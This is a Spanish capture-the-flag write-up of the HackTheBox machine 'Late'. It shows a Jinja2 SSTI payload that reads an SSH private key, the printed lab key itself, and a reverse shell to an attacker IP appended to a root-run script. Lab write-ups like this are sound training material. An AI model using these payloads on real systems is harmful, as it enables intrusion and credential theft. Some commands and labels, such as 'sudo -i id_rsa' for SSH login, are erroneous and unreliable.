---
icon: linux
tags:
  - flask
  - ssti
  - file-upload
  - web
---

# Late

## Resumen

### Detalles

| Campo                 | Detalle        |
| --------------------- | -------------- |
| **Nombre**            | Late           |
| **Sistema Operativo** | Linux          |
| **Plataforma**        | HackTheBox     |
| **Fecha**             | 03/11/2026     |
| **IP Objetivo**       | 10.129.227.134 |

### Executive Summary

La máquina **Late** (Linux, dificultad Easy) expone dos servicios: SSH (22/tcp) y HTTP (80/tcp). La enumeración web reveló el subdominio `images.late.htb`, una aplicación Flask que convierte imágenes a texto mediante OCR (Tesseract). El texto extraído se procesa con `render_template_string()` de Jinja2 sin sanitización, lo que resulta en una vulnerabilidad de **Server-Side Template Injection (SSTI)** que permite ejecución remota de comandos en el contexto del usuario `svc_acc`.

Aprovechando la SSTI, se obtuvo la clave privada SSH de `svc_acc`, lo que permitió el acceso inicial al sistema. La escalada de privilegios se basó en la existencia de un script propiedad de `svc_acc` (`/usr/local/sbin/ssh-alert.sh`) que es ejecutado por **root** en cada inicio de sesión SSH. Dado que el archivo permitía la **adición de contenido** (aunque no su edición directa), se inyectó una reverse shell al final del script, obteniendo así una shell como **root** al reiniciar la sesión.

**Impacto:** Compromiso total del sistema (root), con acceso a información sensible y posibilidad de persistencia mediante la modificación del script ejecutado por root.

### Técnicas

* Abusing Upload File - Image to Text Flask Utility
* SSTI - Server Side Template Injection
* Abusing Cron Job

## Information Gathering

### Port Scanning

#### TCP

```bash
> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.227.134
> nmap -sCV -p22,80 -Pn -n -vv 10.129.227.134 -oG allServices
```

```
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=
|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto | Servicio | Versión                                                      |
| ------ | -------- | ------------------------------------------------------------ |
| 22/tcp | ssh      | OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | http     | nginx 1.14.0 (Ubuntu)                                        |

### Enumeration

#### Web

En el código de fuente de la página web se expone el subdominio: `images.late.htb` ![](<../../../.gitbook/assets/unknown (11).png>)

![](<../../../.gitbook/assets/unknown (12).png>)

Al subir una imagen, se scannea la imagen con OCR para extraer el texto que contenga la imagen y lo entrega en un archivo `results.txt`



## Explotación

### Foothold

Se comprobó que el servidor era vulnerable a **SSTI** subiendo una captura de pantalla que contenía el siguiente payload `{{1+1}}`. El servidor devolvió `<p>2</p>`. Además se comprobó que mediante esta vulnerabilidad era posible leer archivos accesibles por el usuario `svc_acc`, para comprobarlo, se leyó `/etc/passwd` y `/home/svc_acc/app/main.py` (ruta deducida basada en un error que desveló que las imágenes se almacenaban en `/home/svc_acc/app/uploads`)

* **Vulnerabilidad:** SSTI (Server Side Template Injection)
* **Exploit:** Lectura de clave privada con SSTI + Autenticación SSH con clave privada
* **Procedimiento:**

1. Leectura de clave privada de SSH en la ruta `/home/svc_acc/.ssh/id_rsa`

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read() }}
```

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----
```

2. Inicio de sesión en SSH con la key obtenida

```bash
> sudo -i id_rsa 10.129.227.134
```

* **Evidencia:** (`user.txt`)

&#x20;![](<../../../.gitbook/assets/unknown (13).png>)

### Privesc

El directorio `/usr/local/sbin` contiene un script `ssh-alert.sh` que le pertenece al usuario `svc_acc`. Este script consistía en enviarle una notificación a root@late.htb cada vez que ocurría un inicio de sesión en SSH. Utilizando `pspy64` se pudo comprobar que al iniciar sesión por SSH se ejecutaba el script con UID 0 (root).

&#x20;

<figure><img src="../../../.gitbook/assets/unknown (14).png" alt="" width="563"><figcaption></figcaption></figure>

* **Vulnerabilidad:** Abusing Cron Job PATH hijacking
* **Exploit:** Modificación del script `/usr/local/sbin/ssh-alert.sh` para inyectar una reverse shell que se ejecuta como root cada vez que se inicia sesión por SSH.
* **Procedimiento:**

1. Se altera el script añadiendo una reverse shell al final del archivo

```bash
> echo "/bin/bash -i >& /dev/tcp/10.10.14.108/4444 0>&1" >> ssh-alert.sh
```

2. Se pone el puerto `4444` en escucha desde la maquina atacante

```bash
> netcat -lvnp 4444 
```

3. Se realiza el inició de sesión y se recibe la shell como root

```bash
> sudo -i id_rsa 10.129.227.134
```

<figure><img src="../../../.gitbook/assets/unknown (15).png" alt="" width="563"><figcaption></figcaption></figure>

* **Evidencia:** (root.txt)

![](<../../../.gitbook/assets/unknown (16).png>)
